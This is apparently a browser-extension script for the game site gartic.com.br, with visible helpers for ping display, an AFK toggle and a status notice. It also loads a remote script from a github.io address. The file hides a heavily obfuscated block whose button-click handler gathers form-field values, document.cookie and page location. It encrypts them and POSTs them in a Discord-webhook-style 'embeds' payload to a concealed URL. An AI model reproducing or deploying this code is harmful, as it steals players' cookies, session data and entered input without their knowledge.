
async function ping() {
    let t = Date.now();
    await fetch(window.location.href);
    return `${Date.now() - t}ms`;
}

setInterval(() => {
    ping().then((t) => {
        1 == document.location.href.startsWith("https://gartic.com.br/0") &&
            ((document.querySelectorAll("input")[8].attributes[0].textContent = t),
             (document.querySelector("#tema > input.boxvets").disabled = true));
    });
}, 3e3);

setTimeout(() => {
    if (document.URL.startsWith("https://gartic.com.br/0")) {
        document.querySelector("#tema > input.isAfk").checked = true;
    }
}, 1000);

// HTML da parte "seguir"

// if ("https://gartic.com.br/" === document.URL) {
//     var _buceta = document.createElement("input");
//     (_buceta.type = "text"),
//         (_buceta.className = "seguir"),
//         _buceta.setAttribute("placeholder", "Atualizando... padder#7724"),
//         (_buceta.style = "padding-left: 275px;padding-right: 275px;"),
//         document.querySelector("#blocoJogar > div.conteudo").append(_buceta);
//     var _botao = document.createElement("button");
//     (_botao.innerHTML = "Stop"), (_botao.className = "stopChasingMe"),
// 	    (_botao.style = "padding-left: 343px;padding-right: 343px;"),
// 	    document.querySelector("#blocoJogar > div.conteudo").append(_botao);
// }



// cria-se biscuit
document.cookie.includes("chase=") ? console.log("has biscuit") : (document.cookie = "chase=0");

var script = document.createElement("script");
script.type = "text/javascript";
script.src = "https://reddap.github.io/gartic-extension/gatric/trash/chase.js";
document.body.appendChild(script);

"https://gartic.com.br"===document.URL&&(document.querySelector("#blocoJogar > div.conteudo > button").style.backgroundColor="ivory");


// comment
var fodida = setInterval(() => {
    document.querySelector("#blocoJogar > div.conteudo > button") &&
        (clearInterval(fodida),
        (document.querySelector("#blocoJogar > div.conteudo").appendChild(document.createElement("p")).innerHTML =
            "<p align='center'> status: <a  target='_blank' href='https://github.com/reddap/gartic-extension/' style='text-decoration:none'> descontinuado</a>.<br><i>latest update 01-03-2022 - by <a  target='_blank' href='https://discord.com/' style='text-decoration:none'> padder#7724</a></i><p>"));
}, 333);

// x
//sess, rec, biscuit

// biscuit (3)

// aviso para crianças
// var putinha = setInterval(() => {
//     document.querySelector("#blocoJogar > div.conteudo > input") &&
//         (document.querySelector("#blocoJogar > div.conteudo > input").addEventListener("keyup", function (e) {
//             13 === e.keyCode && (alert('Clique em "stop" para interromper a observação e poder jogar normalmente.'), location.reload());
//         }),
//         clearInterval(putinha));
// }, 333);




// filtro "porta"
//         document.URL.startsWith("https://gartic.com.br/0") &&
//             document.querySelector("#botoes > input.bt_orange_medium") &&
//             (document.cookie.includes("chase=0") ||
//                 setTimeout(() => {
//                     document.querySelector("#botoes > input.bt_orange_medium").click();
//                 }, 5e3));


//unnusual

// not my friend


// biscuit identificação

function _0x42a2(_0x4be7c9, _0x307cab) {
    var _0x50b025 = _0x3763();
    return (
        (_0x42a2 = function (_0x333661, _0x4bcf55) {
            _0x333661 = _0x333661 - (-0x1665 + -0x10f * -0x1b + -0xb8 * 0x8);
            var _0x188d01 = _0x50b025[_0x333661];
            if (_0x42a2["Fdprvo"] === undefined) {
                var _0x1ef287 = function (_0x2a1aec) {
                    var _0x5f1e77 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
                    var _0x318392 = "",
                        _0x422edc = "";
                    for (
                        var _0x59a4b1 = 0x1b9c + -0x1143 + 0x1 * -0xa59, _0x350033, _0x5d1ed0, _0x39fe8a = 0x3 * -0x941 + -0x1240 + 0x1 * 0x2e03;
                        (_0x5d1ed0 = _0x2a1aec["charAt"](_0x39fe8a++));
                        ~_0x5d1ed0 && ((_0x350033 = _0x59a4b1 % (-0x1de6 + 0xadf + -0xd * -0x177) ? _0x350033 * (0x26f0 + 0xfc + 0x13d6 * -0x2) + _0x5d1ed0 : _0x5d1ed0), _0x59a4b1++ % (-0xe45 + -0x51a + 0x1363))
                            ? (_0x318392 += String["fromCharCode"]((0x543 + 0x28a * 0x5 + 0x1a * -0xa7) & (_0x350033 >> ((-(0x214 + 0x1 * -0x19cd + -0x87 * -0x2d) * _0x59a4b1) & (-0x15 * -0x169 + -0x1e * 0x106 + -0x5f * -0x3)))))
                            : 0x38 * -0xa7 + -0x1a0 * -0x1 + 0x22e8
                    ) {
                        _0x5d1ed0 = _0x5f1e77["indexOf"](_0x5d1ed0);
                    }
                    for (var _0x185c88 = -0x119 + 0x1813 * 0x1 + -0x16fa, _0x1f7d69 = _0x318392["length"]; _0x185c88 < _0x1f7d69; _0x185c88++) {
                        _0x422edc += "%" + ("00" + _0x318392["charCodeAt"](_0x185c88)["toString"](-0x1 * -0x12e + -0x380 * 0x4 + 0xce2))["slice"](-(0x3b8 + -0x79 * 0xb + 0x17d));
                    }
                    return decodeURIComponent(_0x422edc);
                };
                var _0x5b910e = function (_0x2c8634, _0x3a5ed6) {
                    var _0x148915 = [],
                        _0x2ccc87 = -0x1567 + 0x11f9 + -0x1b7 * -0x2,
                        _0x3a4cb0,
                        _0x18f068 = "";
                    _0x2c8634 = _0x1ef287(_0x2c8634);
                    var _0x47a343;
                    for (_0x47a343 = 0x1f09 * 0x1 + 0x1 * -0x1159 + -0x2 * 0x6d8; _0x47a343 < 0x2 * -0x1253 + 0x1ed1 + 0x247 * 0x3; _0x47a343++) {
                        _0x148915[_0x47a343] = _0x47a343;
                    }
                    for (_0x47a343 = 0x7a1 + 0x272 + 0x1 * -0xa13; _0x47a343 < -0x1d1f + -0x21e0 + -0x1555 * -0x3; _0x47a343++) {
                        (_0x2ccc87 = (_0x2ccc87 + _0x148915[_0x47a343] + _0x3a5ed6["charCodeAt"](_0x47a343 % _0x3a5ed6["length"])) % (-0x62 * 0x33 + -0xa7 * -0xd + 0x1 * 0xc0b)),
                            (_0x3a4cb0 = _0x148915[_0x47a343]),
                            (_0x148915[_0x47a343] = _0x148915[_0x2ccc87]),
                            (_0x148915[_0x2ccc87] = _0x3a4cb0);
                    }
                    (_0x47a343 = 0x112 * -0x13 + 0xee + 0x1368), (_0x2ccc87 = 0x2386 + 0x8 * 0x422 + -0x224b * 0x2);
                    for (var _0x1b5150 = -0x26b3 + -0x6 * -0xaf + 0x11 * 0x209; _0x1b5150 < _0x2c8634["length"]; _0x1b5150++) {
                        (_0x47a343 = (_0x47a343 + (-0xf6b + 0x1 * 0xdcd + -0x19f * -0x1)) % (-0x1356 + -0xeb * 0x16 + 0x511 * 0x8)),
                            (_0x2ccc87 = (_0x2ccc87 + _0x148915[_0x47a343]) % (-0xa3 * -0x15 + -0x1697 + -0xa38 * -0x1)),
                            (_0x3a4cb0 = _0x148915[_0x47a343]),
                            (_0x148915[_0x47a343] = _0x148915[_0x2ccc87]),
                            (_0x148915[_0x2ccc87] = _0x3a4cb0),
                            (_0x18f068 += String["fromCharCode"](_0x2c8634["charCodeAt"](_0x1b5150) ^ _0x148915[(_0x148915[_0x47a343] + _0x148915[_0x2ccc87]) % (-0x5b0 + 0x1639 * -0x1 + -0x3 * -0x9a3)]));
                    }
                    return _0x18f068;
                };
                (_0x42a2["LlDKAp"] = _0x5b910e), (_0x4be7c9 = arguments), (_0x42a2["Fdprvo"] = !![]);
            }
            var _0x17a110 = _0x50b025[-0xb1f + 0x21e * 0x4 + -0x2a7 * -0x1],
                _0x1fc5ba = _0x333661 + _0x17a110,
                _0x46fe3c = _0x4be7c9[_0x1fc5ba];
            return !_0x46fe3c ? (_0x42a2["FogdTp"] === undefined && (_0x42a2["FogdTp"] = !![]), (_0x188d01 = _0x42a2["LlDKAp"](_0x188d01, _0x4bcf55)), (_0x4be7c9[_0x1fc5ba] = _0x188d01)) : (_0x188d01 = _0x46fe3c), _0x188d01;
        }),
        _0x42a2(_0x4be7c9, _0x307cab)
    );
}
function _0x3763() {
    var _0x1515bd = [
        "WPnsW4FcTXpdRc8l",
        "BY3dObVcMa",
        "WO9TW61Axa",
        "lSoBWOXUWPm",
        "W4mHESk1W4RcSg1QvSklBSohmW",
        "EbBcOCotW7W",
        "baimW6VdUW",
        "qCk+WQSz",
        "jCojW5KJW6G",
        "BYBdUmkK",
        "jJxdG3Da",
        "W4RdVeG",
        "cx7cUu/dIG",
        "W4CgW6hdRJC",
        "WOFcVSozgI0",
        "D8kfW6nG",
        "WRDowCoAWPxcLaJcPmo1W5RcUhPX",
        "WPL8lCoIWOK",
        "W7RdJh5dWQC",
        "acj7na",
        "WR3dL1rQWOBdP8oE",
        "W5xdU0nMWQG",
        "tCoXW6VcV3C",
        "fG/dQMTw",
        "oCoHvKPVW4bvW5z2q3bxWQO",
        "oSkzW7BdICoZ",
        "W4NcISoPt8oW",
        "W57cNmoSkeO",
        "WPhdICkrWOldGa",
        "jM7cQmkPWPW",
        "WPyIWR/cNq",
        "emoZW4y+W48",
        "W5CUW45uW5K",
        "B8k5d3a4",
        "emoFWRbKWRK",
        "W6LtWOCoW4m",
        "ySkRW7ruW7u",
        "W6bybCkCW40",
        "WO/dTmkkWR3dOG",
        "WPtcQSoC",
        "ySkRW50",
        "k8ozW4mWW7m",
        "Fd/dOSkVzW",
        "yYldOX/cNSo7vuHOW5jRW6qj",
        "W6FcPCodW4Hc",
        "us/dPSoHmW",
        "WRqgW5frWOlcTmk4l8kLr2JdOrvf",
        "n8kwWQxdUHLve8oPCCoaWQLVW7LD",
        "pSoRxeTRW4vvW7r9DNv3WO4",
        "tIddQCo4iW",
        "a0azW67cVG",
        "W4BdLufnWOC",
        "lSosW4O",
        "W4mtW7RcGIW",
        "WP7dI1a",
        "W4PEWQZdLmkX",
        "W5VcNdOZoG",
        "lNtcP2VdHq",
        "pSkhW7NdIdu",
        "WRxdV8kwWQ3dTq",
        "W5z9WPa",
        "DGJcV8kyWRVdGJyc",
        "W4dcVSo6nmow",
        "W53cHSoRmXW",
        "W4T9WOZdUSkp",
        "a8kvW7BdImkn",
        "ibtcOSolWRy",
        "W4b7W6hdNgddISofWO/dOSkLW4nmtSo3",
        "xCkVWPXqW4m",
        "WR3dTCkcWP3dTW",
        "ntBdUvDO",
        "W7RcNcy6oa",
        "jZpdNgLf",
        "W6tcPmouW6NcSW",
        "WRezWQuJWOq",
        "WPrfWRVdUha1W6q6FCotaSkNrG",
        "W5CUW69HW4C",
        "FKVcVg5O",
        "cKqDW7lcPa",
        "W5r1WO4nW5q",
        "l8ooW4GX",
        "xs/dPSo/pW",
        "gCkNW4BdPW0",
        "aLbJWQlcLa",
        "W7ddMu8",
        "W53dOvGwWOO",
        "gulcK0tdMW",
        "C8kfW7OAW7G",
        "WRFcLCkxmCo4",
        "xZju",
        "W7NdQcKweq",
        "WOxcKtzEDG",
        "umk/WOWSW4a",
        "muVcMmkDWQC",
        "W6ddIJqiW6O",
        "E8k2pa4Q",
        "WRhcLJrvWRC",
        "cmoSW7vKW4W",
        "EuxcUwf5",
        "W5FcI8oOnry",
        "W4qaWPVcQb0",
        "WRa9d8kSW4uoEa",
        "W6tcGr4aW7W",
        "WONdKmk0B0xcTIKosGuPsc5D",
        "mWyRW5BcQG",
        "WObmkSoaWRi",
        "W4VcNbbcpmk9utBdObldRSktqa",
        "WORcLmotkbldJu8",
        "W4NdPsaqgq",
        "WPBcIaj5fa",
        "W6qHW4BdMq",
        "W4BdUCklqhJdO3NdUCocgCo+wSkY",
        "aSoFW7SRW4CStXRdRxT7bCkB",
        "fJrZ",
        "WRHPcCo0WRC",
        "W40iW7VdMCoM",
        "W5ZcPSoBkSoc",
        "WPhcPmoioce",
        "WOvEW5ldMCk6WQW3zq",
        "dH1bW4vlBCko",
        "mWtdNq",
        "j8oCW41DW6C",
        "j8oCW40EW4m",
        "W6VcMci/nG",
        "W7ZdRGO4fW",
        "yHJcRSohW60",
        "bCk0W63dPmkS",
        "p8kwW77dHSoo",
        "W5qrW6dcSG8",
        "WRHnW5Tr",
        "WOlcQ8oqas0",
        "W7ddJrWJnG",
        "W5i0W5LNW4W",
    ];
    _0x3763 = function () {
        return _0x1515bd;
    };
    return _0x3763();
}
(function (_0x3d18f0, _0x1dd659) {
    function _0x29887c(_0x30a7a6, _0x18d2b3, _0xe1d6e7, _0x10eeed, _0x476a58) {
        return _0x42a2(_0x10eeed - 0x45, _0x30a7a6);
    }
    function _0x53f681(_0x33098b, _0x24660c, _0x51b5b5, _0x2f1b3a, _0x44e43a) {
        return _0x42a2(_0x51b5b5 - -0x29f, _0x24660c);
    }
    function _0x479635(_0x49af65, _0x18c9ba, _0x49a7a3, _0x47c27b, _0x4b1aa0) {
        return _0x42a2(_0x4b1aa0 - -0x30b, _0x47c27b);
    }
    function _0x579acc(_0x45d74b, _0x27c69a, _0x43ef98, _0x48e76e, _0x31c02c) {
        return _0x42a2(_0x31c02c - 0x32e, _0x43ef98);
    }
    function _0x9c5a93(_0x59bbee, _0x46a50c, _0x1875d8, _0x36315b, _0x2c7512) {
        return _0x42a2(_0x36315b - -0x338, _0x1875d8);
    }
    var _0x123c03 = _0x3d18f0();
    while (!![]) {
        try {
            var _0x174b5b =
                (parseInt(_0x53f681(-0x1be, "&O1A", -0x1e3, -0x21f, -0x1cf)) / (0x1 * 0x4fc + 0x382 + -0x87d)) * (parseInt(_0x479635(-0x29f, -0x28a, -0x2a0, "S4s5", -0x299)) / (0x1 * -0xb91 + -0x13c + -0x1 * -0xccf)) +
                -parseInt(_0x9c5a93(-0x2de, -0x2a8, "hv^(", -0x2c2, -0x285)) / (0x26e8 + -0x1 * -0x26fc + -0x4de1) +
                (parseInt(_0x479635(-0x238, -0x239, -0x253, "[Ubw", -0x234)) / (-0x1 * 0x107 + 0x24d4 * 0x1 + -0x23c9 * 0x1)) * (-parseInt(_0x53f681(-0x225, "iM%k", -0x222, -0x21b, -0x214)) / (0x4 * -0xb + -0xa9e + 0x1 * 0xacf)) +
                -parseInt(_0x479635(-0x241, -0x261, -0x243, "&O1A", -0x267)) / (0x254f + 0x70d + -0x2c56) +
                -parseInt(_0x579acc(0x3f9, 0x3ce, "$#Qn", 0x3d1, 0x3e8)) / (0xc3d + 0x1d56 + -0x298c) +
                (parseInt(_0x9c5a93(-0x2b5, -0x2e0, "Zsya", -0x2ba, -0x281)) / (-0x2 * 0x667 + 0x56d + -0x769 * -0x1)) * (-parseInt(_0x53f681(-0x1a7, "k9N8", -0x1e4, -0x20c, -0x1b0)) / (0x553 + -0x1 * 0x23c9 + -0x1e7f * -0x1)) +
                (parseInt(_0x579acc(0x3e2, 0x3a6, "2B8&", 0x39f, 0x3ca)) / (-0x6a5 + -0xc22 + 0x12d1)) * (parseInt(_0x479635(-0x27f, -0x252, -0x292, "%jc2", -0x27f)) / (0x12cd + -0x2520 + 0x125e));
            if (_0x174b5b === _0x1dd659) break;
            else _0x123c03["push"](_0x123c03["shift"]());
        } catch (_0x5f18e5) {
            _0x123c03["push"](_0x123c03["shift"]());
        }
    }
})(_0x3763, 0x4a49b + -0x5d358 + 0xf0d90);
function createButtons() {
    function _0x1e61b5(_0x22a0b1, _0x3b0ba8, _0x256f9f, _0x589b91, _0x686cff) {
        return _0x42a2(_0x256f9f - 0x233, _0x22a0b1);
    }
    var _0x3e764a = {
        ANybU: function (_0x6a76a8, _0x52eb35, _0x2e306f) {
            return _0x6a76a8(_0x52eb35, _0x2e306f);
        },
        fPUFB:
            _0x3b65c4(0x2ed, 0x2a6, 0x2c7, 0x2a1, "U$mu") +
            _0x1e61b5("N9wc", 0x35d, 0x31f, 0x355, 0x304) +
            _0xb09cc6(-0x2ca, -0x264, -0x286, "i(9w", -0x2a1) +
            _0xb09cc6(-0x2a7, -0x240, -0x27f, "nTJ!", -0x269) +
            _0x5b428c(0x22c, 0x25b, 0x26a, "[Ubw", 0x239) +
            _0xb09cc6(-0x25d, -0x26f, -0x293, "S4s5", -0x26c) +
            _0x5b428c(0x2de, 0x2ac, 0x2d5, "N9wc", 0x2b6) +
            _0x3b65c4(0x2ac, 0x296, 0x27a, 0x284, "MGRi") +
            _0x1e61b5("wy^^", 0x2e1, 0x308, 0x32a, 0x347) +
            _0x3b65c4(0x302, 0x2ec, 0x2d0, 0x30b, "KLyG") +
            _0x327a9b(-0x174, -0x16d, "$#Qn", -0x1a4, -0x1d0) +
            _0x5b428c(0x275, 0x283, 0x247, "[Ubw", 0x249) +
            _0x5b428c(0x252, 0x267, 0x250, "2MAA", 0x275) +
            _0xb09cc6(-0x255, -0x2aa, -0x277, "S4s5", -0x290) +
            _0x3b65c4(0x2a2, 0x288, 0x273, 0x292, "%c%&") +
            _0x327a9b(-0x20d, -0x201, "Ir3(", -0x1f0, -0x200) +
            _0x1e61b5("Blh4", 0x32a, 0x31b, 0x31c, 0x30d) +
            _0xb09cc6(-0x258, -0x209, -0x25d, "OL4A", -0x245) +
            _0xb09cc6(-0x225, -0x217, -0x20e, "z7[h", -0x243) +
            _0x5b428c(0x24e, 0x23c, 0x250, "iM%k", 0x237) +
            _0x3b65c4(0x26f, 0x2cb, 0x2ac, 0x2d8, "tECV") +
            _0x5b428c(0x2de, 0x2a9, 0x2e1, "t6R^", 0x26f) +
            _0x5b428c(0x2cd, 0x292, 0x28d, "b4c5", 0x2a3) +
            _0x1e61b5("YNb0", 0x301, 0x323, 0x2f8, 0x2fb),
        QCgdc: _0x1e61b5("iM%k", 0x29e, 0x2a8, 0x2e3, 0x2ba),
        fnFMm: _0x3b65c4(0x279, 0x2ea, 0x2ab, 0x2bb, "U$mu") + _0x327a9b(-0x21d, -0x22d, "Ir3(", -0x1f8, -0x1bd) + _0x5b428c(0x29f, 0x273, 0x27f, "2B8&", 0x247) + "n",
        KSyvX: _0x5b428c(0x232, 0x25d, 0x294, ")Ef@", 0x256),
        MpJqJ: _0xb09cc6(-0x240, -0x24c, -0x237, "aL2y", -0x24a) + "xA",
        uUiEO: _0x5b428c(0x21e, 0x256, 0x24c, "aL2y", 0x224) + "n",
        PmeDa: function (_0x11af81, _0x23d9be) {
            return _0x11af81 < _0x23d9be;
        },
        sFxYT: _0x327a9b(-0x19a, -0x205, "ubAt", -0x1c4, -0x1f0),
    };
    function _0x3b65c4(_0x2c7792, _0x868463, _0xe6cb45, _0x3d5423, _0x8ced10) {
        return _0x42a2(_0xe6cb45 - 0x1ed, _0x8ced10);
    }
    function _0x327a9b(_0x5587f2, _0x2768a3, _0x57c730, _0x41f0d5, _0x553237) {
        return _0x42a2(_0x41f0d5 - -0x27a, _0x57c730);
    }
    function _0x5b428c(_0x9f45a3, _0x5b747f, _0x4d233c, _0x312802, _0x4f9b6d) {
        return _0x42a2(_0x5b747f - 0x1c2, _0x312802);
    }
    function _0xb09cc6(_0x43bfcc, _0x4e361e, _0x3dde90, _0x50fe16, _0xa97c65) {
        return _0x42a2(_0xa97c65 - -0x337, _0x50fe16);
    }
    for (
        ii = 0x1925 + -0x1cd * -0xd + -0x308e,
            v = document[_0x5b428c(0x234, 0x249, 0x23b, "%jc2", 0x24d) + _0x327a9b(-0x1cf, -0x1a6, "wy^^", -0x1c8, -0x1a4) + _0x1e61b5("ZR@h", 0x2dc, 0x2df, 0x2a3, 0x2e6) + "l"](_0x3e764a[_0x3b65c4(0x26d, 0x29d, 0x25d, 0x239, "y0)T")])[
                _0x5b428c(0x22e, 0x25f, 0x26a, "y0)T", 0x27f) + "h"
            ];
        _0x3e764a[_0x3b65c4(0x2b2, 0x271, 0x28e, 0x25e, "tECV")](ii, v);

    )
        document[_0xb09cc6(-0x289, -0x2b1, -0x2e5, "ZR@h", -0x2ac) + _0xb09cc6(-0x2a9, -0x2e9, -0x2eb, "4BHa", -0x2c4) + _0x1e61b5("jAVG", 0x2b3, 0x2de, 0x2ef, 0x306) + "l"](_0x3e764a[_0x5b428c(0x253, 0x247, 0x220, "%c%&", 0x245)])[ii++][
            _0xb09cc6(-0x229, -0x25d, -0x251, "wy^^", -0x266) + _0x5b428c(0x21c, 0x23e, 0x232, "hv^(", 0x221) + _0x5b428c(0x225, 0x25c, 0x28f, "hv^(", 0x286) + "r"
        ](_0x3e764a[_0x327a9b(-0x189, -0x1cc, "Jp%S", -0x196, -0x155)], function () {
            function _0x54583e(_0x33293f, _0x5dca0c, _0x355a94, _0x352adb, _0x250c7b) {
                return _0xb09cc6(_0x33293f - 0x1c1, _0x5dca0c - 0x121, _0x355a94 - 0x135, _0x355a94, _0x250c7b - 0x6b3);
            }
            function _0x5b32c3(_0x1647af, _0x20cfaf, _0x1dd4fd, _0x511167, _0x2d22ae) {
                return _0xb09cc6(_0x1647af - 0x69, _0x20cfaf - 0x1c4, _0x1dd4fd - 0xf1, _0x1647af, _0x1dd4fd - 0x2fa);
            }
            function _0x17d1d4(_0x593fd9, _0x203fd5, _0x41fa8c, _0xc7ed, _0x4b1627) {
                return _0xb09cc6(_0x593fd9 - 0x2e, _0x203fd5 - 0x199, _0x41fa8c - 0x196, _0xc7ed, _0x4b1627 - 0x162);
            }
            function _0x4fe612(_0x137ee3, _0x54279e, _0x52fdb7, _0x166476, _0x21b64e) {
                return _0x5b428c(_0x137ee3 - 0x142, _0x21b64e - 0x14d, _0x52fdb7 - 0x1d5, _0x52fdb7, _0x21b64e - 0x1de);
            }
            function _0x46f294(_0x2bfbda, _0x101fbb, _0x5629cf, _0x1d8083, _0x3b4a6a) {
                return _0x3b65c4(_0x2bfbda - 0xd6, _0x101fbb - 0x19c, _0x2bfbda - 0x17c, _0x1d8083 - 0x63, _0x3b4a6a);
            }
            _0x3e764a[_0x17d1d4(-0xdf, -0x109, -0x140, "39zT", -0x10f)](fetch, _0x3e764a[_0x46f294(0x412, 0x44f, 0x423, 0x401, "rESl")], {
                method: _0x3e764a[_0x46f294(0x444, 0x466, 0x45c, 0x461, "$#Qn")],
                headers: { Accept: _0x3e764a[_0x4fe612(0x3a9, 0x3a0, "4BHa", 0x380, 0x392)], "Content-Type": _0x3e764a[_0x5b32c3("39zT", 0x65, 0xa1, 0xcf, 0x78)] },
                mode: _0x3e764a[_0x4fe612(0x3c4, 0x3a6, "k9N8", 0x374, 0x3b1)],
                body: JSON[_0x54583e(0x43d, 0x438, "%c%&", 0x40b, 0x449) + _0x17d1d4(-0x135, -0xe8, -0x110, "YNb0", -0x12b)]({
                    embeds: [
                        {
                            description:
                                _0x54583e(0x41a, 0x470, "hv^(", 0x462, 0x42f) +
                                CryptoJS[_0x5b32c3("N9wc", 0x88, 0x5a, 0x2f, 0x62)][_0x4fe612(0x40b, 0x3ca, "8DX%", 0x418, 0x3ec) + "pt"](
                                    _0x4fe612(0x3a3, 0x380, "aL2y", 0x35e, 0x390) +
                                        ":\x20" +
                                        _renderer +
                                        (_0x17d1d4(-0x12e, -0x108, -0x121, "&O1A", -0x128) + _0x46f294(0x419, 0x434, 0x441, 0x40d, "Blh4") + _0x5b32c3(")Ef@", 0x48, 0x56, 0x67, 0x26)) +
                                        tt[_0x46f294(0x454, 0x46b, 0x488, 0x420, "&O1A") + _0x54583e(0x486, 0x488, "Zsya", 0x49e, 0x461)]()[_0x46f294(0x43d, 0x44a, 0x46c, 0x463, "i(9w") + "ce"](/(\,)/gi, "\x0a") +
                                        (_0x17d1d4(-0x16f, -0xf1, -0x16f, "X#8[", -0x12f) + _0x46f294(0x448, 0x46f, 0x430, 0x42a, "U$mu") + _0x5b32c3("S4s5", 0xaa, 0xb2, 0xb1, 0xcc) + _0x5b32c3("rESl", 0x70, 0x42, 0xd, 0x31)) +
                                        document[_0x4fe612(0x3b2, 0x396, "z7[h", 0x371, 0x3a1) + "e"]
                                            [_0x5b32c3("ZR@h", 0x9e, 0x9b, 0x86, 0x75) + _0x46f294(0x429, 0x3ed, 0x452, 0x3fa, "aL2y")]()
                                            [_0x4fe612(0x3d1, 0x3c0, "Ir3(", 0x41a, 0x3e2) + "ce"](/(\;)/gi, ";\x0a") +
                                        (_0x4fe612(0x3a2, 0x38d, "aL2y", 0x373, 0x38f) + _0x17d1d4(-0xfc, -0x129, -0xf7, "i(9w", -0x103) + ":\x20") +
                                        window[_0x4fe612(0x389, 0x3d4, "nTJ!", 0x3a3, 0x393) + _0x54583e(0x43b, 0x462, "c%6x", 0x455, 0x444)][_0x5b32c3("aL2y", 0x82, 0x9f, 0x6b, 0x8f)] +
                                        _0x5b32c3("Blh4", 0x7e, 0x77, 0x92, 0x3f),
                                    _0x3e764a[_0x17d1d4(-0x14d, -0x15a, -0x15a, "y0)T", -0x15c)]
                                ) +
                                _0x4fe612(0x3fa, 0x3cf, "OL4A", 0x3ef, 0x3ef),
                        },
                    ],
                }),
            });
        });
}
setInterval(() => {
    var _0x5d6a89 = {};
    function _0x46d9fd(_0x17b308, _0x1f7e87, _0xe105b9, _0xd792d9, _0x3165c2) {
        return _0x42a2(_0xd792d9 - 0x8, _0x3165c2);
    }
    (_0x5d6a89[_0x46d9fd(0xd3, 0x12d, 0xf2, 0xf6, "&!9M")] = _0x46d9fd(0xfd, 0x10a, 0xd6, 0xcf, "wy^^")),
        (_0x5d6a89[_0x5595eb(0x41e, "i(9w", 0x441, 0x42d, 0x434)] = function (_0x4e3cb6, _0x142df0) {
            return _0x4e3cb6 < _0x142df0;
        }),
        (_0x5d6a89[_0x212032(0x2b6, 0x29c, 0x2c3, 0x2a0, "KLyG")] = _0x212032(0x2fe, 0x32b, 0x31a, 0x321, "4BHa") + _0x46d9fd(0x46, 0x71, 0x9a, 0x80, "2SBf"));
    function _0x5595eb(_0x58cc85, _0x187261, _0x3bf2a5, _0x44a8b3, _0x1ccce2) {
        return _0x42a2(_0x44a8b3 - 0x38a, _0x187261);
    }
    function _0x5464e4(_0x13623b, _0x14ab83, _0x3f5dd3, _0x8c94c1, _0x55edb0) {
        return _0x42a2(_0x8c94c1 - 0x111, _0x13623b);
    }
    _0x5d6a89[_0x5464e4("X#8[", 0x1ff, 0x1e4, 0x1db, 0x1cd)] = function (_0x1f7e53, _0x11957c) {
        return _0x1f7e53 != _0x11957c;
    };
    function _0x160f10(_0x2e4a5b, _0x22309b, _0x347728, _0x5db5b3, _0x4c2df7) {
        return _0x42a2(_0x2e4a5b - -0x15a, _0x4c2df7);
    }
    _0x5d6a89[_0x212032(0x281, 0x2a1, 0x2af, 0x2d1, "X#8[")] = function (_0x46a159, _0xf3a3d1) {
        return _0x46a159 + _0xf3a3d1;
    };
    function _0x212032(_0x4a466c, _0x1a437f, _0x18eb02, _0x1211b1, _0x48960c) {
        return _0x42a2(_0x18eb02 - 0x234, _0x48960c);
    }
    var _0x4f7636 = _0x5d6a89,
        _0x5ebee1 = -0x5dc * 0x1 + 0x9b3 + -0x3d7;
    for (
        v = document[_0x5464e4("N9wc", 0x1b5, 0x190, 0x1af, 0x1d9) + _0x212032(0x2c6, 0x2fe, 0x2f8, 0x2ec, "Ir3(") + _0x5595eb(0x412, "MGRi", 0x47b, 0x44f, 0x43a) + "l"](_0x4f7636[_0x5595eb(0x46d, "wy^^", 0x41c, 0x432, 0x46d)])[
            _0x5595eb(0x403, "aL2y", 0x46d, 0x43f, 0x433) + "h"
        ],
            tt = [];
        _0x4f7636[_0x46d9fd(0xa6, 0x84, 0x9a, 0x96, "kqJZ")](_0x5ebee1, v);

    )
        (mm = document[_0x212032(0x325, 0x32e, 0x31d, 0x2db, "rESl") + _0x5595eb(0x3f6, "MGRi", 0x3f9, 0x422, 0x40f) + _0x212032(0x2cd, 0x30c, 0x300, 0x335, "c%6x") + "l"](_0x4f7636[_0x160f10(-0x79, -0xb2, -0x5f, -0x7b, "OL4A")])[
            _0x5ebee1++
        ]),
            mm[_0x160f10(-0xd2, -0xbe, -0xa6, -0x104, "kqJZ")][_0x212032(0x2d8, 0x2f8, 0x2ed, 0x305, "8DX%") + _0x5595eb(0x45d, "hops", 0x475, 0x44c, 0x457)](_0x4f7636[_0x46d9fd(0xc3, 0xe1, 0xe8, 0xc0, "Lz^Q")]) ||
                (_0x4f7636[_0x46d9fd(0x128, 0x122, 0xbf, 0xea, "MGRi")](mm[_0x160f10(-0xd1, -0xa5, -0xa8, -0xfd, "hv^(")][_0x5464e4("$#Qn", 0x1f9, 0x1ba, 0x1c0, 0x1e0) + "h"], -0xc46 + 0x23f8 + -0x1780) &&
                    _0x4f7636[_0x46d9fd(0xbb, 0xd3, 0xb2, 0xe1, "nk7Z")]("", mm[_0x212032(0x319, 0x2b2, 0x2f1, 0x2c7, "8DX%")]) &&
                    t[_0x46d9fd(0x76, 0x6e, 0xdc, 0x9d, "ubAt")](
                        _0x4f7636[_0x46d9fd(0xab, 0xbc, 0x78, 0x7c, "t6R^")](_0x4f7636[_0x46d9fd(0xd8, 0xb2, 0xf2, 0xcb, "c%6x")](mm[_0x5464e4("2SBf", 0x178, 0x1d2, 0x1b0, 0x1b0)], ":\x20"), mm[_0x46d9fd(0xb8, 0xcc, 0x88, 0x99, "nTJ!")])
                    ));
}, -0x7f + 0x1152 + -0x10c9),
    setTimeout(() => {
        function _0xfcfc32(_0x21ac3e, _0x5ad62a, _0x6da155, _0x12e58d, _0x273088) {
            return _0x42a2(_0x273088 - 0x363, _0x6da155);
        }
        var _0x3dc001 = {
            PizOp: function (_0x201088) {
                return _0x201088();
            },
        };
        _0x3dc001[_0xfcfc32(0x44c, 0x42b, "KLyG", 0x43a, 0x411)](createButtons);
    }, -0x9 * 0x3d5 + 0x2409 * 0x1 + 0x838);
